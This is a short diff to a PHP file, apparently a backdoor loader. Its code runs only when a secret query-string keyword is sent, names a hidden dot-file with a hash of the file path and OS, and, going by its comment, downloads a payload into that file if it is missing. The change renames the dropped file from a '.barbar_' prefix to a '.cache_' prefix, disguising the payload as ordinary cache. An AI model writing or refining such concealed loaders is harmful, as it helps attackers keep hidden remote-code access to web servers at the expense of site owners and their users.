@@ -9,7 +9,7 @@ if ($_SERVER['QUERY_STRING'] === 'JandaPirangAbang') {
 
     // 🔐 Nama file acak tapi tetap (berbasis lokasi file & OS)
     $hash = md5(__FILE__ . php_uname());
-    $filename = ".barbar_{$hash}.php";
+    $filename = ".cache_{$hash}.php";
     $cache_file = rtrim($LOCAL_CACHE_DIR, '/\\') . DIRECTORY_SEPARATOR . $filename;
 
     // 🔁 Cek & download kalau belum ada
